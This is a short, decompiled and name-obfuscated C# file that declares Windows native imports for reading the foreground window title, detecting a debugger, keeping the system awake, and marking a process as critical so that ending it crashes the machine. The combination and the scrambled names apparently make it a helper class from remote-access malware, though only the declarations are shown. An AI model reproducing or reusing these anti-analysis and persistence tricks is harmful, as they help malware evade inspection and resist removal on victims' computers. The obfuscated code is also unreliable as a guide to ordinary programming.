using System;
using System.Runtime.InteropServices;
using System.Text;

namespace vKSmRqGoNtRxzam
{
	// Token: 0x0200000B RID: 11
	public static class rIfzBHOgIAYDt
	{
		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
		public static extern IntPtr yzIbUgKGkCE();

		// Token: 0x06000039 RID: 57
		[DllImport("user32.dll", EntryPoint = "GetWindowText")]
		public static extern int NHcgviVlPnKhXe(IntPtr pvrBvcToPgYT, StringBuilder QHlyGqppja, int fisGbUDJXvnY);

		// Token: 0x0600003A RID: 58
		[DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
		public static extern IntPtr QthxerGUbhkgdoDbM(string NKMkjmBMmGtAZY);

		// Token: 0x0600003B RID: 59
		[DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", ExactSpelling = true, SetLastError = true)]
		public static extern bool HOvUiiDUhNHY(IntPtr UMhUbTQocqIG, ref bool RIvRtcyyBv);

		// Token: 0x0600003C RID: 60
		[DllImport("kernel32.dll", EntryPoint = "SetThreadExecutionState", SetLastError = true)]
		public static extern rIfzBHOgIAYDt.iTerLTLWvTl HHzTZnCTmP(rIfzBHOgIAYDt.iTerLTLWvTl cDhXPkOXasZWS);

		// Token: 0x0600003D RID: 61
		[DllImport("ntdll.dll", EntryPoint = "RtlSetProcessIsCritical", SetLastError = true)]
		public static extern void QnFRMUibfZVu(uint bmpqkTFqcHN, uint vfKachNifMhNRiH, uint MFaMiRrfwtBhE);

		// Token: 0x0200000C RID: 12
		public enum iTerLTLWvTl : uint
		{
			// Token: 0x04000020 RID: 32
			bExdLuXnuxOhVM = 2147483648U,
			// Token: 0x04000021 RID: 33
			VSWfFrXSgSWbaf = 2U,
			// Token: 0x04000022 RID: 34
			EePNBAzdzVph = 1U
		}
	}
}
